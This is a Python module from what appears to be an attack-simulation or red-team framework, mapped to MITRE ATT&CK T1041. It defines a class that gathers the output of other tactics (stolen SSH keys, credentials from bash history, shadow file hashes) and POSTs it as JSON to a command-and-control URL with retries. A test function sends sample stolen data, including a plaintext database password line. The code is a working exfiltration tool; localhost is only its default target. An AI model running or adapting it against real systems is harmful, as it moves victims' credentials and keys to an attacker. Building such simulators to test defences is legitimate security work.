#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun May 24 2026

@author: hounsousamuel
"""

import os
import sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

import time
import asyncio
from typing import Dict, Any, Optional, List

import aiohttp

from tactics.base import Base
from tactics.mittres import MITRE
from simulateur_utils.logger import get_logger

logger = get_logger()


class ExfiltrationHTTP(Base):
    """
    Exfiltration de données vers un serveur C2 via HTTP POST.

    Technique MITRE ATT&CK: T1041 - Exfiltration Over C2 Channel

    Prend les résultats des autres tactics (SSHKeyTheft, BashHistoryRead,
    PasswordFileDump, etc.) et les envoie en POST JSON vers une URL C2.
    Simule ce qu'un vrai attaquant fait pour centraliser les données volées
    même si la cible est nettoyée après l'attaque.

    Attributes:
        exfil_result (Dict): Résultat brut.
        sent_payloads (List[Dict]): Payloads envoyés avec succès.
        failed_payloads (List[Dict]): Payloads en échec.
    """

    def __init__(
        self,
        name: str = "exfiltration_http",
        c2_url: str = "http://127.0.0.1:8888/exfil",
        timeout: int = 10,
        max_retries: int = 3,
        chunk_size: int = 100,     # nb de champs max par payload
        **kwargs
    ):
        super().__init__(name=name, **kwargs)
        self.c2_url = c2_url
        self.timeout = timeout
        self.max_retries = max_retries
        self.chunk_size = chunk_size

        self.exfil_result: Dict[str, Any] = {}
        self.sent_payloads: List[Dict] = []
        self.failed_payloads: List[Dict] = []

    # =========================================================================
    # HELPERS
    # =========================================================================

    def _build_payload(
        self,
        target_ip: str,
        data: Dict[str, Any],
        source: str = "unknown",
    ) -> Dict[str, Any]:
        """Construit le payload à envoyer vers le C2."""
        return {
            "timestamp": time.time(),
            "target_ip": target_ip,
            "source": source,       # nom de la tactic qui a collecté les données
            "data": data,
        }

    def _compute_severity(self) -> str:
        if self.sent_payloads:
            return "CRITICAL"
        if self.failed_payloads:
            return "MEDIUM"
        return "LOW"

    # =========================================================================
    # CORE ASYNC
    # =========================================================================

    async def _send_payload(
        self,
        session: aiohttp.ClientSession,
        payload: Dict[str, Any],
    ) -> bool:
        """Envoie un payload vers le C2 avec retry."""
        for attempt in range(1, self.max_retries + 1):
            try:
                async with session.post(
                    url=self.c2_url,
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                ) as response:
                    if response.status in (200, 201):
                        self.log(
                            f"✅ Payload envoyé [{payload['source']}] → {self.c2_url} "
                            f"(status {response.status})",
                            log=True
                        )
                        return True
                    else:
                        self.log(
                            f"⚠️ Status inattendu {response.status} "
                            f"(tentative {attempt}/{self.max_retries})",
                            log=True
                        )

            except aiohttp.ClientConnectorError:
                self.log(f"❌ Connexion refusée vers {self.c2_url}", log=True)
                break   # Inutile de retry si le C2 est injoignable

            except asyncio.TimeoutError:
                self.log(
                    f"⏱️ Timeout tentative {attempt}/{self.max_retries}",
                    log=True
                )

            except Exception as e:
                self.log(f"⚠️ Erreur envoi : {e}", log=True)

            if attempt < self.max_retries:
                await asyncio.sleep(1)

        return False

    async def _exfil_async(
        self,
        target_ip: str,
        tactic_results: Dict[str, Any],
    ) -> Dict[str, Any]:
        """
        Exfiltre les résultats de toutes les tactics vers le C2.

        Parameters
        ----------
        target_ip : str
            IP de la machine victime.
        tactic_results : Dict[str, Any]
            Dict {nom_tactic: résultat} — ex:
            {
                "ssh_key_theft": {...},
                "bash_history_read": {...},
                "password_file_dump": {...},
            }
        """
        self.log(
            f"Début ExfiltrationHTTP → {self.c2_url} "
            f"({len(tactic_results)} source(s))",
            log=True
        )
        self.start_time = time.time()

        async with aiohttp.ClientSession() as session:
            tasks = []
            for source, data in tactic_results.items():
                payload = self._build_payload(
                    target_ip=target_ip,
                    data=data,
                    source=source,
                )
                tasks.append(
                    asyncio.create_task(
                        self._send_payload(session, payload),
                        name=f"exfil_{source}"
                    )
                )

            results = await asyncio.gather(*tasks, return_exceptions=True)

        # Classer succès / échec
        sources = list(tactic_results.keys())
        for i, result in enumerate(results):
            source = sources[i]
            payload = self._build_payload(target_ip, tactic_results[source], source)
            if result is True:
                self.sent_payloads.append(payload)
            else:
                self.failed_payloads.append(payload)

        self.end_time = time.time()
        self.log(
            f"ExfiltrationHTTP terminée — "
            f"{len(self.sent_payloads)} envoyé(s), "
            f"{len(self.failed_payloads)} échoué(s)",
            log=True
        )
        return self._get_result()

    async def exfil_async(
        self,
        target_ip: str,
        tactic_results: Dict[str, Any],
        total_timeout: Optional[float] = None,
    ) -> Dict[str, Any]:
        if total_timeout:
            try:
                async with asyncio.timeout(total_timeout):
                    return await self._exfil_async(target_ip, tactic_results)
            except asyncio.TimeoutError:
                self.log(f"Timeout après {total_timeout}s", log=True)
                return self._get_result()
        return await self._exfil_async(target_ip, tactic_results)

    def exfil_sync(self, *args, **kwargs) -> Dict[str, Any]:
        return asyncio.run(self.exfil_async(*args, **kwargs))

    # =========================================================================
    # RÉSULTAT
    # =========================================================================

    def _get_result(self) -> Dict[str, Any]:
        self.save()
        return {
            "severity": self._compute_severity(),
            "elapsed": self.end_time - self.start_time if self.end_time and self.start_time else 0,
            "mitres": [MITRE.get("DataExfiltrationHTTP", {})],
            "results": {
                "c2_url": self.c2_url,
                "sent_count": len(self.sent_payloads),
                "failed_count": len(self.failed_payloads),
                "sent_payloads": self.sent_payloads,
                "failed_payloads": self.failed_payloads,
            },
        }


# =============================================================================
# Test
# =============================================================================

def test_exfiltration_http(
    target_ip: str = "172.17.0.2",
    c2_url: str = "http://127.0.0.1:8888/exfil",
    total_timeout: float = 30.0,
):
    print(f"\n📤 Test ExfiltrationHTTP → {c2_url}")
    print("-" * 50)

    # Données simulées — comme si SSHKeyTheft et BashHistoryRead avaient tourné
    fake_results = {
        "ssh_key_theft": {
            "stolen_keys_count": 2,
            "usable_keys": [
                {"name": "id_rsa", "type": "RSA", "usable": True, "content": "-----BEGIN RSA..."}
            ],
            "known_hosts": [{"host": "192.168.1.10", "port": 22}],
        },
        "bash_history_read": {
            "credentials_count": 1,
            "credentials_found": [
                {"type": "mysql/mariadb password", "line": "mysql -u root -pS3cr3t"}
            ],
        },
        "password_file_dump": {
            "hashes_count": 3,
            "shadow_readable": True,
            "hashes": [
                {"user": "root", "algo": "SHA-512", "crackable": True}
            ],
        },
    }

    exfil = ExfiltrationHTTP(c2_url=c2_url, timeout=5, max_retries=2)
    result = exfil.exfil_sync(
        target_ip=target_ip,
        tactic_results=fake_results,
        total_timeout=total_timeout,
    )

    severity = result.get("severity", "UNKNOWN")
    icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}.get(severity, "⚪")
    r = result.get("results", {})

    print(f"\n{icon} Sévérité : {severity}")
    print(f"⏱️  Temps : {result.get('elapsed', 0):.2f}s")
    print(f"✅ Envoyés : {r.get('sent_count', 0)}")
    print(f"❌ Échoués : {r.get('failed_count', 0)}")

    return result


if __name__ == "__main__":
    test_exfiltration_http()